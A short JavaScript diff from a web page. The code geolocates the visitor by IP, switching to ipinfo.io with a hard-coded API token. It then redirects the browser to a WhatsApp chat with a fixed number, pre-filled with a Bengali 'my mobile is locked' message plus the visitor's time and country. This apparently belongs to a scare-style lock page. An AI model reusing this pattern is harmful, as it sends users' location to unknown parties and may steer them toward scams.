@@ -201,18 +201,18 @@
         };
         const localTime = new Intl.DateTimeFormat('bn-BD', options).format(now);
 
-        fetch("https://ipapi.co/json/")
+        fetch("https://ipinfo.io/json?token=5cae82c2bf3804")
           .then(res => res.json())
           .then(data => {
             const country = data.country || 'unknown';
             const message = `আমার মোবাইল লক হয়ে গেছে\nসময়: ${localTime}\n ${country}`;
-            const encodedMessage = encodeURIComponent(message);
-            window.location.href = `https://wa.me/8801328673342?text=${encodedMessage}`;
+            const encoded = encodeURIComponent(message);
+            window.location.href = `https://wa.me/8801328673342?text=${encoded}`;
           })
           .catch(() => {
             const message = `আমার মোবাইল লক হয়ে গেছে\nসময়: ${localTime}\n unknown`;
-            const encodedMessage = encodeURIComponent(message);
-            window.location.href = `https://wa.me/8801328673342?text=${encodedMessage}`;
+            const encoded = encodeURIComponent(message);
+            window.location.href = `https://wa.me/8801328673342?text=${encoded}`;
           });
       }
     }, 1000);
